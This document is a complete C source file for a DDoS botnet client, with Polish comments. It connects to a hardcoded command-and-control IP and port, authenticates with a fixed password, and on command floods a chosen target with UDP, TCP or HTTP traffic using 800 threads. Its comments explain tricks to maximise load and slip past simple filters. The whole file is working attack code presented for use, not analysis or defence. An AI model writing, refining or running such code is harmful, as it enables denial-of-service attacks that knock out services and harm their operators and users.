#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <netinet/tcp.h>

// ==========================================
// KONFIGURACJA BOTA C2
// ==========================================
#define MASTER_IP "93.115.101.182"
#define MASTER_PORT 11290
#define NUM_THREADS 800  // Pompujemy 100% mocy z VPSa

volatile int stop_attack = 0;
time_t attack_end_time = 0;

typedef struct {
    char ip[64];
    int port;
    char method[16];
} AttackArgs;

// Helper by wymusić twardy reset gniazda i uniknąć TIME_WAIT, co zabija moc
void set_linger(int sock) {
    struct linger sl;
    sl.l_onoff = 1;
    sl.l_linger = 0;
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &sl, sizeof(sl));
}

void *udp_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    char payload[65507]; // Max UDP payload
    for(int i = 0; i < 65507; i++) payload[i] = rand() % 255;

    while(time(NULL) < attack_end_time && !stop_attack) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        // Optymalizacja buffora dla max predkosci
        int bufsize = 1024 * 1024;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
        
        connect(sock, (struct sockaddr *)&target, sizeof(target));
        
        for(int i = 0; i < 2000; i++) {
            if(stop_attack) break;
            // Losowy rozmiar pakietu by omijac proste filtry
            int size = (rand() % 64000) + 1024; 
            send(sock, payload, size, MSG_NOSIGNAL);
        }
        close(sock);
    }
    return NULL;
}

void *tcp_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    char payload[1024];
    for(int i = 0; i < 1024; i++) payload[i] = rand() % 255;

    while(time(NULL) < attack_end_time && !stop_attack) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        set_linger(sock); // Zapobiega TIME_WAIT
        
        int flag = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(int)); // Wylacza algorytm Nagle'a (pakiety leca instant)
        
        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr *)&target, sizeof(target));
        
        // Pompujemy śmieci w otwarte gniazdo
        for(int i = 0; i < 1000; i++) {
            if(stop_attack) break;
            send(sock, payload, 1024, MSG_NOSIGNAL);
        }
        close(sock);
    }
    return NULL;
}

void *http_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    char request[512];
    snprintf(request, sizeof(request), 
             "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n", 
             args->ip);

    int req_len = strlen(request);

    while(time(NULL) < attack_end_time && !stop_attack) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        set_linger(sock); // Zapobiega zapchaniu portów
        
        // HTTP lepiej zablokować na connect żeby poprawnie wysłać request
        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
            for(int i=0; i<10; i++) { // pipelining atak
                if(stop_attack) break;
                send(sock, request, req_len, MSG_NOSIGNAL);
            }
        }
        close(sock);
    }
    return NULL;
}

void start_attack(char *method, char *ip, int port, int duration) {
    if (!stop_attack && attack_end_time > time(NULL)) {
        stop_attack = 1;
        sleep(1); // Czekamy chwile az stare watki obumra
    }
    stop_attack = 0;
    attack_end_time = time(NULL) + duration;
    
    static AttackArgs args;
    strncpy(args.ip, ip, sizeof(args.ip));
    args.port = port;
    strncpy(args.method, method, sizeof(args.method));

    printf("[*] Rozpoczynam bezlitosny atak %s na %s:%d przez %d sekund (%d watkow)\n", method, ip, port, duration, NUM_THREADS);

    pthread_t threads[NUM_THREADS];
    for(int i = 0; i < NUM_THREADS; i++) {
        if(strcmp(method, "udp") == 0) {
            pthread_create(&threads[i], NULL, udp_flood, (void *)&args);
        } else if(strcmp(method, "tcp") == 0) {
            pthread_create(&threads[i], NULL, tcp_flood, (void *)&args);
        } else if(strcmp(method, "http") == 0) {
            pthread_create(&threads[i], NULL, http_flood, (void *)&args);
        }
    }
    
    // Wątki działają w tle (detach), główny wątek wraca do nasłuchiwania Mastera
    for(int i = 0; i < NUM_THREADS; i++) {
        pthread_detach(threads[i]);
    }
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];

    printf("======================================\n");
    printf("   [!] BOT (C) URUCHOMIONY NA VPS [!]\n");
    printf("   [!] WERSJA: NIEOGRANICZONA MOC [!]\n");
    printf("======================================\n");

    while(1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_family = AF_INET;
        server.sin_port = htons(MASTER_PORT);
        server.sin_addr.s_addr = inet_addr(MASTER_IP);

        printf("[*] Szukam Mastera na %s:%d...\n", MASTER_IP, MASTER_PORT);

        if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            sleep(5);
            close(sock);
            continue;
        }

        // Czekamy na "Podaj haslo:" lub prompt i wysyłamy autoryzację
        memset(buffer, 0, sizeof(buffer));
        recv(sock, buffer, sizeof(buffer), 0);
        send(sock, "bot_secret_xyz\n", 15, 0);
        
        printf("[+] Polaczono z C2. Czekam na krew...\n");

        while(1) {
            memset(buffer, 0, sizeof(buffer));
            int bytes_received = recv(sock, buffer, sizeof(buffer)-1, 0);
            
            if(bytes_received <= 0) {
                printf("[!] Rozlaczono z Masterem.\n");
                break;
            }

            // Usunięcie znaków nowej linii
            buffer[strcspn(buffer, "\r\n")] = 0;

            if(strcmp(buffer, "PING") == 0) continue;

            if(strcmp(buffer, "stop") == 0) {
                printf("[*] Otrzymano rozkaz przerwania ataku!\n");
                stop_attack = 1;
                continue;
            }

            // Analiza komendy: udp <ip> <port> <time>
            char method[16], ip[64];
            int port, duration;
            if(sscanf(buffer, "%15s %63s %d %d", method, ip, &port, &duration) == 4) {
                if(strcmp(method, "udp") == 0 || strcmp(method, "tcp") == 0 || strcmp(method, "http") == 0) {
                    start_attack(method, ip, port, duration);
                }
            }
        }
        close(sock);
        sleep(5);
    }
    return 0;
}
